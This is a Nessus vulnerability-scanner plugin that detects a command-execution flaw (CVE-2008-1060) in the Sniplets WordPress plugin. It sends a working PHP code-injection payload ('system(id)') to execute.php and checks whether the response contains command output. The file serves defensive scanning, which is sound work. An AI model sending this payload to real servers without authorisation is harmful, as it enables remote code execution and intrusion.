#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31167);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/05/19 18:02:19 $");

  script_cve_id("CVE-2008-1060");
  script_bugtraq_id(27985);
  script_osvdb_id(42260);
  script_xref(name:"EDB-ID", value:"5194");
  script_xref(name:"Secunia", value:"29099");

  script_name(english:"Sniplets Plugin for WordPress execute.php 'text' Parameter Arbitrary Command Execution");
  script_summary(english:"Attempts to run a command using Sniplets plugin.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Sniplets, a third-party text insertion
plugin for WordPress.

The version of Sniplets installed on the remote host passes user input
to the 'text' parameter of the 'modules/execute.php' script before
passing it to an 'eval()' statement. Provided that PHP's
'register_globals' setting is enabled, an unauthenticated remote
attacker can leverage this issue to execute arbitrary code on the
remote host subject to the privileges of the web server user id.

Note that the Sniplets plugin is also reportedly affected by
cross-site scripting and remote file inclusion vulnerabilities;
however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/488734");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/sniplets/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.2.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/02/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/02/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/02/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:sniplets_plugin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Sniplets";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "sniplets/resource/admin.js"][0] =
    make_list('function setupSniplets');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to exploit the flaw to run a command.
cmd = "id";
exploit = "<?php system(" +cmd+ ");";

w = http_send_recv3(
  method:"GET",
  item: dir + "/wp-content/plugins/sniplets/modules/execute.php?text=" +
    urlencode(str:exploit),
  port:port,
  exit_on_fail:TRUE
);
res = w[2];

# There's a problem if...
if (
  # the output looks like it's from id or...
  egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
  # PHP's disable_functions prevents running system().
  egrep(pattern:"Warning.+ has been disabled for security reasons", string:res)
)
{
if (
  report_verbosity > 0 &&
  egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)
)
{
  report =
    '\n' +
    'Nessus was able to execute the command "' +  cmd + '" on the remote\n' +
    'host to produce the following results :\n' +
    '\n' +
    "  " + egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
